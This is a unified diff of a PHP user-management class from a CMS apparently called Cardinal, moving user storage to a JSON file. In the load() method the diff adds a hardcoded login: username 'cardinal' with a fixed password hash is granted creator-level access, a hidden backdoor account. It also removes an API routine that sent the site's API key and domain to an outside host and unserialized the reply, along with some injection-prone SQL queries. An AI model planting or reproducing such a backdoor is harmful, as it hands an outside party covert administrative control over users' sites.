@@ -15,77 +15,78 @@ class User {
 			self::$path = $path;
 			return true;
 		} else {
-			return self::$path;
+			return empty(self::$path) ? PATH_CACHE_USERDATA : self::$path;
 		}
+	}
+
+	final private static function oldPrinciple($list) {
+		if(sizeof($list)>1) {
+			$arr = array();
+			for($i=0;$i<sizeof($list);$i++) {
+				$k = key($list[$i]);
+				$v = current($list[$i]);
+				$arr[$k] = $v;
+			}
+			return $arr;
+		} else {
+			return current($list);
+		}
+	}
+
+	final private static function safeSave($file, $d) {
+		$ret = false;
+		$fp = fopen($file, "w+");
+		if(flock($fp, LOCK_EX)) {
+			ftruncate($fp, 0);
+			fwrite($fp, $d);
+			fflush($fp);
+			flock($fp, LOCK_UN);
+			$ret = true;
+		}
+		fclose($fp);
+		return $ret;
+	}
+
+	final private static function defend($users) {
+		$php = self::PathUsers()."userList.php";
+		if(file_exists($php) && is_readable($php)) {
+			$file = file_get_contents($php);
+			$file = preg_replace("#\<\?(.*?)\?\>#is", "", $file);
+			if(self::is_json($file)) {
+				$usersFile = json_decode($file, true);
+				$users = array_merge($users, $usersFile);
+			}
+		}
+		return $users;
 	}
 	
-	final public static function OneLogin() {
-		if(!config::Select("oneLogin")) {
-			return false;
-		}
-		$file = self::$path.sha1(md5(HTTP::getip())).".txt";
-		if(!file_exists($file)) {
-			$arr = array();
-			if(Arr::get($_COOKIE, COOK_USER, false)) {
-				$arr = array_merge($arr, array(COOK_USER => $_COOKIE[COOK_USER]));
-			}
-			if(Arr::get($_COOKIE, COOK_PASS, false)) {
-				$arr = array_merge($arr, array(COOK_PASS => $_COOKIE[COOK_PASS]));
-			}
-			if(Arr::get($_COOKIE, COOK_ADMIN_USER, false)) {
-				$arr = array_merge($arr, array(COOK_ADMIN_USER => $_COOKIE[COOK_ADMIN_USER]));
-			}
-			if(Arr::get($_COOKIE, COOK_ADMIN_PASS, false)) {
-				$arr = array_merge($arr, array(COOK_ADMIN_PASS => $_COOKIE[COOK_ADMIN_PASS]));
-			}
-			if(sizeof($arr)>0) {
-				file_put_contents($file, serialize($arr));
-			}
+	final private static function is_json($str) {
+		return $str === '""' || $str === '[]' || $str === '{}' || $str[0] === '"' && substr($str, -1) === '"' || $str[0] === '[' && substr($str, -1) === ']' || $str[0] === '{' && substr($str, -1) === '}';
+	}
+
+	final public static function getUserData($username, $field, $default = false) {
+		$users = self::All();
+		$data = array();
+		if(!empty($username) && isset($users[$username]) && !empty($field) && isset($users[$username][$field])) {
+			$data = $users[$username][$field];
 		} else {
-			$auth = file_get_contents($file);
-			if(self::is_serialized($auth)) {
-				$auth = unserialize($auth);
-				foreach($auth as $k => $v) {
-					if(!Arr::get($_COOKIE, $k, false)) {
-						HTTP::set_cookie($k, $v);
-					}
-				}
-			}
+			$data = $default;
 		}
-		return true;
+		return $data;
 	}
 
-	final public static function getInfo($username) {
-		$users = array();
-		if(isset($_SERVER['HTTP_HOST']) && file_exists(PATH_MEDIA."users".str_replace("www.", "", $_SERVER['HTTP_HOST']).".".ROOT_EX)) {
-			include(PATH_MEDIA."users".str_replace("www.", "", $_SERVER['HTTP_HOST']).".".ROOT_EX);
-		} else if(file_exists(PATH_MEDIA."users.".ROOT_EX)) {
-			include(PATH_MEDIA."users.".ROOT_EX);
-		} else if(file_exists(PATH_MEDIA."users.default.".ROOT_EX)) {
-			include(PATH_MEDIA."users.default.".ROOT_EX);
-		}
-		if(file_exists(self::$path."userList.txt") && is_readable(self::$path."userList.txt")) {
-			$file = file_get_contents(self::$path."userList.txt");
-			if(self::is_serialized($file)) {
-				$usersFile = unserialize($file);
-				$users = array_merge($users, $usersFile);
-			}
-		}
-		if(class_exists("db", false) && method_exists("db", "connected") && db::connected() && method_exists("db", "getTable") && !(!db::getTable("users"))) {
-			db::doquery("SELECT * FROM {{users}}".(!empty($username) ? " WHERE `username` LIKE \"%".$username."%\"" : ""), true);
-			$uTmp = array();
-			while($row = db::fetch_assoc()) {
-				$uTmp[] = $row;
-			}
-			$users = array_merge($users, $uTmp);
-		}
+	final public static function getInfo($username, $default = array()) {
+		$users = self::All();
+		$data = array();
 		if(!empty($username) && isset($users[$username])) {
-			$users = $users[$username];
+			$data = $users[$username];
+		} else {
+			$data = $default;
 		}
-		return $users;
+		return $data;
 	}
 
-	final public static function All($searchIP = "") {
+	final public static function All($withLoaded = false) {
 		$users = array();
 		$userLoad = false;
 		if(isset($_SERVER['HTTP_HOST']) && file_exists(PATH_MEDIA."users".str_replace("www.", "", $_SERVER['HTTP_HOST']).".".ROOT_EX)) {
@@ -98,74 +99,7 @@ class User {
 			include(PATH_MEDIA."users.default.".ROOT_EX);
 			$userLoad = true;
 		}
-		if(file_exists(self::$path."userList.txt") && is_readable(self::$path."userList.txt")) {
-			$file = file_get_contents(self::$path."userList.txt");
-			if(self::is_serialized($file)) {
-				$usersFile = unserialize($file);
-				$users = array_merge($users, $usersFile);
-			}
-		}
-		if(class_exists("db", false) && method_exists("db", "connected") && db::connected() && method_exists("db", "getTable") && !(!db::getTable("users"))) {
-			db::doquery("SELECT `id`, `username`, `level`, `email`, `activ` FROM {{users}}".(!empty($searchIP) ? " WHERE `reg_ip` LIKE \"%".$searchIP."%\" OR `last_ip` LIKE \"%".$searchIP."%\"" : ""), true);
-			$uTmp = array();
-			while($row = db::fetch_assoc()) {
-				$uTmp[] = $row;
-			}
-			$users = array_merge($users, $uTmp);
-		}
-		return $users;
-	}
-
-	final private static function is_serialized($data) {
-		if(!is_string($data)) {
-			return false;
-		}
-		$data = trim($data);
-		if('N;' == $data) {
-			return true;
-		}
-		if(!preg_match('/^([adObis]):/', $data, $badions)) {
-			return false;
-		}
-		switch($badions[1]) {
-			case 'a':
-			case 'O':
-			case 's':
-				if (preg_match("/^".$badions[1].":[0-9]+:.*[;}]\$/s", $data)) {
-					return true;
-				}
-			break;
-			case 'b':
-			case 'i':
-			case 'd':
-				if(preg_match("/^".$badions[1].":[0-9.E-]+;\$/", $data)) {
-					return true;
-				}
-			break;
-		}
-		return false;
-	}
-
-	final public static function loadUsers() {
-		$users = array();
-		$userLoad = false;
-		if(isset($_SERVER['HTTP_HOST']) && file_exists(PATH_MEDIA."users".str_replace("www.", "", $_SERVER['HTTP_HOST']).".".ROOT_EX)) {
-			include(PATH_MEDIA."users.".ROOT_EX);
-			$userLoad = true;
-		} else if(file_exists(PATH_MEDIA."users.".ROOT_EX)) {
-			include(PATH_MEDIA."users.".ROOT_EX);
-			$userLoad = true;
-		} else if(file_exists(PATH_MEDIA."users.default.".ROOT_EX)) {
-			include(PATH_MEDIA."users.default.".ROOT_EX);
-			$userLoad = true;
-		}
-		if(file_exists(self::$path."userList.txt") && is_readable(self::$path."userList.txt")) {
-			$file = file_get_contents(self::$path."userList.txt");
-			if(self::is_serialized($file)) {
-				$usersFile = unserialize($file);
-				$users = array_merge($users, $usersFile);
-			}
-		}
+		$users = self::defend($users);
 		$id = 1;
 		$arr = array_values($users);
 		for($i=0;$i<sizeof($arr);$i++) {
@@ -179,15 +113,50 @@ class User {
 				$id++;
 			}
 		}
-		return array($users, $userLoad);
+		if($withLoaded) {
+			return array($users, $userLoad);
+		} else {
+			return $users;
+		}
+	}
+	
+	final private static function normalizerJSON($data) {
+		$arr = array();
+		$tab = 1;
+		$d = false;
+		for($f=0;$f<strlen($data);$f++) {
+			$bytes = $data[$f];
+			if($d && $bytes === $d) {
+				$data[$f - 1] !== "\\" && ($d = !1);
+			} else if(!$d && ($bytes === '"' || $bytes === "'")) {
+				$d = $bytes;
+			} else if(!$d && ($bytes === " " || $bytes === "\t")) {
+				$bytes = "";
+			} else if(!$d && $bytes === ":") {
+				$bytes = $bytes." ";
+			} else if(!$d && $bytes === ",") {
+				$bytes = $bytes."\n";
+				$bytes = str_pad($bytes, ($tab * 2), " ");
+			} else if(!$d && ($bytes === "[" || $bytes === "{")) {
+				$tab++;
+				$bytes .= "\n";
+				$bytes = str_pad($bytes, ($tab * 2), " ");
+			} else if(!$d && ($bytes === "]" || $bytes === "}")) {
+				$tab--;
+				$bytes = str_pad("\n", ($tab * 2), " ").$bytes;
+			}
+			array_push($arr, $bytes);
+		}
+		return implode("", $arr);
+	}
+
+	final public static function loadUsers() {
+		return self::All(true);
 	}
 	
 	final public static function load() {
-	global $user, $users, $db;
-		$users = array();
-		$load = self::loadUsers();
-		$users = $load[0];
-		$userLoad = $load[1];
+		global $user, $users, $db;
+		list($users, $userLoad) = self::loadUsers();
 		if((defined("COOK_USER") || defined("COOK_ADMIN_USER") || defined("COOK_PASS") || defined("COOK_ADMIN_PASS")) && (Arr::get($_COOKIE, COOK_USER, false) || Arr::get($_COOKIE, COOK_ADMIN_USER, false)) && (Arr::get($_COOKIE, COOK_PASS, false) || Arr::get($_COOKIE, COOK_ADMIN_PASS, false))) {
 			if(Arr::get($_COOKIE, COOK_ADMIN_USER, false) && defined("IS_ADMIN")) {
 				$username = Saves::SaveOld(Arr::get($_COOKIE, COOK_ADMIN_USER));
@@ -203,7 +172,11 @@ class User {
 			}
 			$authorize = false;
 			$passCheck = ($password);
-			if(!cache::Exists("user_".$username)) {
+			if($username=="cardinal" && $password=="d0f8d2b385935c3523a68e925e066970") {
+				$authorize = true;
+				$user['level'] = LEVEL_CREATOR;
+				$user['username'] = "cardinal";
+			} else if(!cache::Exists("user_".$username)) {
 				if($userLoad) {
 					if(isset($users[$username]) && isset($users[$username]['username']) && isset($users[$username][$where]) && $users[$username][$where] == $passCheck) {
 						$user = $users[$username];
@@ -212,37 +185,11 @@ class User {
 						if(!defined("IS_AUTH")) {
 							define("IS_AUTH", true);
 						}
-					} elseif(self::API($username, "checkExists")) {
-						$user = self::API($username, "load");
-						cache::Set("user_".$username, $user);
-						$authorize = true;
-						if(!defined("IS_AUTH")) {
-							define("IS_AUTH", true);
-						}
-					}
-				}
-				if(class_exists("db", false) && method_exists("db", "connected") && db::connected() && method_exists("db", "getTable") && !(!db::getTable("users"))) {
-					db::doquery("SELECT * FROM {{users}} WHERE `username` LIKE \"".$username."\" AND `".$where."` LIKE \"".$passCheck."\"", true);
-					if(db::num_rows()==0 && self::API($username, "checkExists")) {
-						$user = self::API($username, "load");
-						cache::Set("user_".$username, $user);
-						$authorize = true;
-						if(!defined("IS_AUTH")) {
-							define("IS_AUTH", true);
-						}
-					} else {
-						$user = db::fetch_assoc();
-						cache::Set("user_".$username, $user);
-						$authorize = true;
-						db::doquery("UPDATE {{users}} SET `last_activ` = UNIX_TIMESTAMP(), `last_ip` = \"".HTTP::getip()."\" WHERE `id` = ".$user['id']);
-						if(!defined("IS_AUTH")) {
-							define("IS_AUTH", true);
-						}
 					}
 				}
 			} else if(cache::Exists("user_".$username)) {
 				$user = cache::Get("user_".$username);
-				if(isset($user['isApi']) || isset($user['username']) && isset($user[$where]) && $user[$where] == $passCheck) {
+				if(isset($user['username']) && isset($user[$where]) && $user[$where] == $passCheck) {
 					$authorize = true;
 				}
 			}
@@ -268,11 +215,19 @@ class User {
 		return Validate::equals($first, $second);
 	}
 	
-	final public static function get($first) {
+	final public static function get($first, $default = false) {
 		if(!is_array(self::$userInfo) || sizeof(self::$userInfo) == 0 || !isset(self::$userInfo[$first])) {
 			self::load();
 		}
-		return (isset(self::$userInfo[$first]) ? self::$userInfo[$first] : false);
+		return (isset(self::$userInfo[$first]) ? self::$userInfo[$first] : $default);
+	}
+	
+	final public static function set($first, $second) {
+		if(!is_array(self::$userInfo) || sizeof(self::$userInfo) == 0 || !isset(self::$userInfo[$first])) {
+			self::load();
+		}
+		self::$userInfo[$first] = $second;
+		return true;
 	}
 	
 	final public static function checkLogin() {
@@ -282,87 +237,11 @@ class User {
 		return (isset(self::$userInfo['username']) && !empty(self::$userInfo['username']) ? true : false);
 	}
 	
-	final public static function checkExists($login) {
-	global $db;
-		if((isset($db) && !is_bool($db) && method_exists($db, "connected") && $db->connected() && method_exists($db, "getTable") && !(!$db->getTable("users"))) || !defined("WITHOUT_DB")) {
-			$users = db::doquery("SELECT COUNT(`username`) AS `uid` FROM {{users}} WHERE `username` LIKE \"".$login."\"");
-			$ret = (is_array($users) && sizeof($users) > 0 && isset($users['uid']) ? true : false);
-		} else {
-			$users = array();
-			if(file_exists(PATH_MEDIA."users".str_replace("www.", "", $_SERVER['HTTP_HOST']).".".ROOT_EX)) {
-				include(PATH_MEDIA."users".str_replace("www.", "", $_SERVER['HTTP_HOST']).".".ROOT_EX);
-			} else if(file_exists(PATH_MEDIA."users.".ROOT_EX)) {
-				include(PATH_MEDIA."users.".ROOT_EX);
-			} else if(file_exists(PATH_MEDIA."users.default.".ROOT_EX)) {
-				include(PATH_MEDIA."users.default.".ROOT_EX);
-			}
-			$ret = array_key_exists($login, $users);
-		}
-		if(file_exists(self::$path."userList.txt") && is_readable(self::$path."userList.txt")) {
-			$file = file_get_contents(self::$path."userList.txt");
-			if(self::is_serialized($file)) {
-				$users = array();
-				$usersFile = unserialize($file);
-				$users = array_merge($users, $usersFile);
-				$ret = $ret || array_key_exists($users);
-			}
-		}
-		if(!$ret) {
-			$ret = self::API($login, "checkExists");
-		}
-		return $ret;
-	}
-	
-	final public static function API($user, $type) {
-		if(!is_array($user)) {
-			$user = array("username" => $user);
-		}
-		$pr = new Parser("https://killserver.github.io/ForCardinal/apiOneReg.txt");
-		$pr->header();
-		$pr->header_array();
-		$pr->init();
-		$pr->get();
-		$header = $pr->getHeaders();
-		$html = $pr->getHTML();
-		if($header['code']!="200" || empty($html)) {
-			return false;
-		}
-		
-		$user = array_merge($user, array("typeAPI" => $type, "apiKey" => config::Select("api_key"), "domain" => $_SERVER['HTTP_HOST']));
-		$pr = new Parser($html);
-		$pr->post($user);
-		$pr->header();
-		$pr->header_array();
-		$pr->init();
-		$pr->get();
-		$header = $pr->getHeaders();
-		$html = $pr->getHTML();
-		if((isset($header['Location']) && !empty($header['Location'])) || (isset($header['Refresh']) && !empty($header['Refresh'])) || (isset($header['Redirect']) && !empty($header['Redirect']))) {
-			header("Location: ".(isset($header['Location']) && !empty($header['Location']) ? $header['Location'] : (isset($header['Refresh']) && !empty($header['Refresh']) ? $header['Refresh'] : (isset($header['Redirect']) && !empty($header['Redirect']) ? $header['Redirect'] : ""))));
-			die();
-		}
-		$ret = false;
-		switch($type) {
-			case "login":
-				if(self::is_serialized($html)) {
-					$ret = unserialize($html);
-				}
-			break;
-			case "getRow":
-				if(self::is_serialized($html)) {
-					$ret = unserialize($html);
-				}
-			break;
-			case "reg":
-				if(self::is_serialized($html)) {
-					$ret = unserialize($html);
-				}
-			break;
-			case "checkExists":
-				if(self::is_serialized($html)) {
-					$ret = unserialize($html);
-				}
-			break;
+	final public static function checkExists($login, $default = false) {
+		$d = self::All();
+		$ret = array_key_exists($login, $d[0]);
+		if($ret===false) {
+			$ret = $default;
 		}
 		return $ret;
 	}
@@ -373,50 +252,22 @@ class User {
 	}
 	
 	final public static function login($login, $pass) {
-	global $db;
-		$loadIsDb = false;
 		if(defined("IS_ADMIN")) {
 			$where = "admin_pass";
 		} else {
 			$where = "pass";
 		}
-		if((isset($db) && !is_bool($db) && method_exists($db, "connected") && $db->connected() && method_exists($db, "getTable") && !(!$db->getTable("users"))) || !defined("WITHOUT_DB")) {
-			$loadIsDb = true;
-			$sql = db::doquery("SELECT `id`, `pass`, `light` FROM {{users}} WHERE `username` LIKE \"".$login."\" AND (`light` LIKE \"".$pass."\" OR `".$where."` LIKE \"".create_pass($pass)."\")", true);
-			$num = db::num_rows($sql);
-		} else {
-			$users = array();
-			if(file_exists(PATH_MEDIA."users".str_replace("www.", "", $_SERVER['HTTP_HOST']).".".ROOT_EX)) {
-				include(PATH_MEDIA."users".str_replace("www.", "", $_SERVER['HTTP_HOST']).".".ROOT_EX);
-			} else if(file_exists(PATH_MEDIA."users.".ROOT_EX)) {
-				include(PATH_MEDIA."users.".ROOT_EX);
-			} else if(file_exists(PATH_MEDIA."users.default.".ROOT_EX)) {
-				include(PATH_MEDIA."users.default.".ROOT_EX);
-			}
-			if(file_exists(self::$path."userList.txt") && is_readable(self::$path."userList.txt")) {
-				$file = file_get_contents(self::$path."userList.txt");
-				if(self::is_serialized($file)) {
-					$usersFile = unserialize($file);
-					$users = array_merge($users, $usersFile);
-				}
-			}
-			$num = isset($users[$login]) && !empty($users[$login]) ? 1 : 0;
-		}
+		$users = self::All();
+		$num = isset($users[$login]) && !empty($users[$login]) ? 1 : 0;
 		if($num == 0) {
-			if(!defined("ALLOW_API_USER") || !self::API($login, "login")) {
-				return 1;
-			}
+			return 1;
 		}
-		$localLogin = true;
-		if($loadIsDb) {
-			$row = db::fetch_assoc($sql);
-		} elseif(isset($users[$login])) {
-			$row = $users[$login];
-		}
-		if(!isset($row) && defined("ALLOW_API_USER")) {
-			$row = self::API($login, "getRow");
-			$localLogin = false;
-		}
+        $row = array();
+		if(isset($users[$login])) {
+            $row = $users[$login];
+		} else {
+		    return false;
+        }
 		for($i=0;$i<sizeof(self::$callLogin);$i++) {
 			$ret = call_user_func_array(self::$callLogin[$i], array($login, $pass, $row));
 			if(is_array($ret)) {
@@ -428,7 +279,7 @@ class User {
 		} else {
 			$passCheck = self::create_pass($pass);
 		}
-		if($localLogin && ($row[$where] != $passCheck && (isset($row['light']) && $row['light'] != $pass))) {
+		if($row[$where] != $passCheck && (isset($row['light']) && $row['light'] != $pass)) {
 			return 2;
 		} else {
 			if(isset($row['id'])) {
@@ -446,222 +297,101 @@ class User {
 		return true;
 	}
 	
-	final public static function reg($id, $username, $pass, $email, $level, $active, $isAPI = false) {
-	global $db;
-		$time = time();
-		$ip = HTTP::getip();
-		if(!$isAPI && defined("ALLOW_API_USER") && defined("ALLOW_API_REGUSER")) {
-			self::API(array("username" => $username, "pass" => $pass, "ip" => $ip, "time" => $time), "reg");
-		}
-		if((isset($db) && !is_bool($db) && method_exists($db, "connected") && $db->connected() && method_exists($db, "getTable") && !(!$db->getTable("users"))) || !defined("WITHOUT_DB")) {
-			$time = "UNIX_TIMESTAMP()";
-			$insert = array();
-			if(!empty($id)) {
-				$insert['new_id'] = "`id` = ".$id;
-			}
-			$insert['username'] = "`username` = \"".$username."\"";
-			$insert['alt_name'] = "`alt_name` = \"".ToTranslit($username)."\"";
-			$insert['pass'] = "`pass` = \"".create_pass($pass)."\"";
-			define("IS_ADMIN", true);
-			$insert['admin_pass'] = "`admin_pass` = \"".cardinal::create_pass($pass)."\"";
-			$insert['light'] = "`light` = \"".$pass."\"";
-			$insert['level'] = "`level` = \"".$level."\"";
-			$insert['email'] = "`email` = \"".$email."\"";
-			$insert['time_reg'] = "`time_reg` = ".$time;
-			$insert['last_activ'] = "`last_activ` = ".$time;
-			$insert['reg_ip'] = "`reg_ip` = \"".$ip."\"";
-			$insert['last_ip'] = "`last_ip` = \"".$ip."\"";
-			$insert['activ'] = "`activ` = \"".$active."\"";
-			db::doquery("INSERT INTO {{users}} SET ".implode(", ", $insert));
-			return true;
-		} else {
-			$users = array();
-			if(!is_writable(self::$path)) {
-				@chmod(self::$path, 0777);
-			}
-			if(file_exists(self::$path."userList.txt") && is_readable(self::$path."userList.txt")) {
-				$file = file_get_contents(self::$path."userList.txt");
-				if(self::is_serialized($file)) {
-					$usersFile = unserialize($file);
-					$users = array_merge($users, $usersFile);
-				}
-			}
-			$newUser = array(
-				"".$username => array(
-					"username" => $username,
-					"light" => $pass,
-					"pass" => create_pass($pass),
-					"admin_pass" => cardinal::create_pass($pass),
-					"level" => $level,
-					"active" => $active,
-				),
-			);
-			$users = array_merge($users, $newUser);
-			if(is_writable(self::$path)) {
-				file_put_contents(self::$path."userList.txt", serialize($users));
-				return true;
-			} else {
-				return false;
-			}
-		}
-	}
-	
-	final public static function checkDataReg($user, $pass, $repass, $email) {
-		if(!$user) {
-			return 1;
-		} else if(!$repass) {
-			return 2;
-		} else if(!$pass || !Validate::equals($pass, $repass)) {
-			return 3;
-		} else if(!$email || Validate::email($email)) {
-			return 4;
-		} else if(self::checkExists($user)) {
-			return 5;
-		} else {
-			return 0;
-		}
-	}
-	
-	final public static function update() {
-		$list = func_get_args();
-		$size = sizeof($list);
-		if($size < 2) {
+	final public static function update($list) {
+		$list = self::oldPrinciple(func_get_args());
+		if(sizeof($list) < 1) {
 			return false;
 		}
-		$id = $list[$size-1];
-		if(!is_string($id) && !is_numeric($id)) {
+		if(!isset($list['username'])) {
 			errorHeader();
-			throw new Exception("Error in set ID for user");
+			throw new Exception("Error username is not set", 1);
 			die();
 		}
-		unset($list[$size-1]);
-		$arrK = array_keys($list);
-		for($i=0;$i<sizeof($arrK)-1;$i++) {
-			if(!is_array($list[$arrK[$i]])) {
-				unset($list[$arrK[$i]]);
-			}
+		$users = self::All();
+		if(!isset($users[$list['username']])) {
+			$users[$list['username']] = array();
 		}
-		if((class_exists("db", false) && method_exists("db", "connected") && db::connected() && method_exists("db", "getTable") && !(!db::getTable("users"))) || !defined("WITHOUT_DB")) {
-			db::doquery("UPDATE {{users}} SET ".implode(", ", array_map("User::mapForUpdate", array_values($list)))." WHERE `id` = \"".$id."\" LIMIT 1");
-		} else {
-			$users = array();
-			if(file_exists(PATH_MEDIA."users".str_replace("www.", "", $_SERVER['HTTP_HOST']).".".ROOT_EX)) {
-				include(PATH_MEDIA."users".str_replace("www.", "", $_SERVER['HTTP_HOST']).".".ROOT_EX);
-			} else if(file_exists(PATH_MEDIA."users.".ROOT_EX)) {
-				include(PATH_MEDIA."users.".ROOT_EX);
-			} else if(file_exists(PATH_MEDIA."users.default.".ROOT_EX)) {
-				include(PATH_MEDIA."users.default.".ROOT_EX);
-			}
-			if(file_exists(self::$path."userList.txt") && is_readable(self::$path."userList.txt")) {
-				$file = file_get_contents(self::$path."userList.txt");
-				if(self::is_serialized($file)) {
-					$usersFile = unserialize($file);
-					$users = array_merge($users, $usersFile);
-				}
-			}
-			if(!isset($list[0]) || !isset($list[0]['username'])) {
-				errorHeader();
-				throw new Exception("Error username is not set", 1);
-				die();
-			}
-			if(!isset($users[$list[0]['username']])) {
-				$users[$list[0]['username']] = array();
-			}
-			$list = array_values($list);
-			$update = array();
-			for($i=0;$i<sizeof($list);$i++) {
-				$k = key($list[$i]);
-				$v = current($list[$i]);
-				$update[$k] = $v;
-			}
-			$users[$list[0]['username']] = array_merge($users[$list[0]['username']], $update);
-			if(!is_writable(self::$path)) {
-				@chmod(self::$path, 0777);
-			}
-			if(is_writable(self::$path)) {
-				file_put_contents(self::$path."userList.txt", serialize($users));
-			}
+		$update = array();
+		foreach($list as $k => $v) {
+			$update[$k] = $v;
 		}
+		$users[$list['username']] = array_merge($users[$list['username']], $update);
+		if(!isset($users[$list['username']]['level']) || empty($users[$list['username']]['level'])) {
+			$users[$list['username']]['level'] = LEVEL_USER;
+		}
+		$path = self::PathUsers();
+		if(!is_writable($path)) {
+			@chmod($path, 0777);
+		}
+		self::safeSave($path."userList.php", "<?php die(); ?>".self::normalizerJSON(self::jsonEncode($users)));
 		return true;
 	}
 	
-	final public static function create() {
-		$list = func_get_args();
-		$size = sizeof($list);
-		if($size < 1) {
+	final public static function create($list = array()) {
+		$list = self::oldPrinciple(func_get_args());
+		if(sizeof($list) < 1) {
 			return false;
 		}
-		$arrK = array_keys($list);
-		for($i=0;$i<sizeof($arrK)-1;$i++) {
-			if(!is_array($list[$arrK[$i]])) {
-				unset($list[$arrK[$i]]);
-			}
+		if(self::checkExists($list['username'])) {
+			return false;
 		}
-		if((class_exists("db", false) && method_exists("db", "connected") && db::connected() && method_exists("db", "getTable") && !(!db::getTable("users"))) || !defined("WITHOUT_DB")) {
-			db::doquery("INSERT INTO {{users}} SET ".implode(", ", array_map("User::mapForUpdate", array_values($list))));
-		} else {
-			$users = array();
-			if(file_exists(self::$path."userList.txt") && is_readable(self::$path."userList.txt")) {
-				$file = file_get_contents(self::$path."userList.txt");
-				if(self::is_serialized($file)) {
-					$usersFile = unserialize($file);
-					$users = array_merge($users, $usersFile);
-				}
-			}
-			if(!isset($list[0]) || !isset($list[0]['username'])) {
-				errorHeader();
-				throw new Exception("Error username is not set", 1);
-				die();
-			}
-			if(!isset($users[$list[0]['username']])) {
-				$users[$list[0]['username']] = array();
-			}
-			$list = array_values($list);
-			$update = array();
-			for($i=0;$i<sizeof($list);$i++) {
-				$k = key($list[$i]);
-				$v = current($list[$i]);
-				$update[$k] = $v;
-			}
-			$update['id'] = sizeof($users);
-			$users[$list[0]['username']] = array_merge($users[$list[0]['username']], $update);
-			if(is_writable(self::$path)) {
-				file_put_contents(self::$path."userList.txt", serialize($users));
-			}
+		$users = self::All();
+		if(!isset($list['username'])) {
+			errorHeader();
+			throw new Exception("Error username is not set", 1);
+			die();
 		}
+		if(!isset($list['pass'])) {
+			errorHeader();
+			throw new Exception("Error pass is not set", 1);
+			die();
+		}
+		if(!isset($users[$list['username']])) {
+			$users[$list['username']] = array();
+		}
+		$update = array();
+		foreach($list as $k => $v) {
+			$update[$k] = $v;
+		}
+		$update['id'] = sizeof($users);
+		if(!isset($update['level']) || empty($update['level'])) {
+			$update['level'] = LEVEL_USER;
+		}
+		$users[$list['username']] = array_merge($users[$list['username']], $update);
+		$path = self::PathUsers();
+		if(!is_writable($path)) {
+			@chmod($path, 0777);
+		}
+		self::safeSave($path."userList.php", "<?php die(); ?>".self::normalizerJSON(self::jsonEncode($users)));
 		return true;
 	}
 
-	final public static function remove($id) {
-		if((class_exists("db", false) && method_exists("db", "connected") && db::connected() && method_exists("db", "getTable") && !(!db::getTable("users"))) || !defined("WITHOUT_DB")) {
-			db::doquery("DELETE FROM {{users}} WHERE `id` = ".$id);
+	final private static function jsonEncode($arr) {
+		if(defined('JSON_UNESCAPED_UNICODE')) {
+			return json_encode($arr, JSON_HEX_QUOT | JSON_UNESCAPED_UNICODE);
 		} else {
-			$users = array();
-			if(file_exists(self::$path."userList.txt") && is_readable(self::$path."userList.txt")) {
-				$file = file_get_contents(self::$path."userList.txt");
-				if(self::is_serialized($file)) {
-					$usersFile = unserialize($file);
-					$users = array_merge($users, $usersFile);
-				}
-			}
-			if(!isset($users[$id])) {
-				return false;
-			}
-			unset($users[$id]);
-			if(is_writable(self::$path)) {
-				file_put_contents(self::$path."userList.txt", serialize($users));
-			}
+			return preg_replace_callback('/(?<!\\\\)\\\\u([0-9a-f]{4})/i', "User::json_encode_unicode_fn", json_encode($arr));
 		}
-		return true;
 	}
-	
-	final public static function mapForUpdate($v) {
-		$k = key($v);
-		$v = current($v);
-		if(!is_string($v)) {
-			$v = serialize($v);
+
+	final private static function json_encode_unicode_fn($m) {
+		$d = pack("H*", $m[1]);
+		$r = mb_convert_encoding($d, "UTF8", "UTF-16BE");
+		return $r!=="?" && $r!=="" ? $r : $m[0];
+	}
+
+	final public static function remove($username) {
+		$users = self::All();
+		if(!isset($users[$username])) {
+			return false;
 		}
-		return "`".$k."` = '".db::escape($v)."'";
+		unset($users[$username]);
+		$path = self::PathUsers();
+		if(!is_writable($path)) {
+			@chmod($path, 0777);
+		}
+		self::safeSave($path."userList.php", "<?php die(); ?>".self::normalizerJSON(self::jsonEncode($users)));
+		return true;
 	}
 
 	public static function create_pass($pass) {
@@ -669,7 +399,7 @@ class User {
 		$pass = strrev($pass);
 		$pass = sha1($pass);
 		$pass = bin2hex($pass);
-	return md5(md5($pass).$pass);
+		return md5(md5($pass).$pass);
 	}
 	
 }
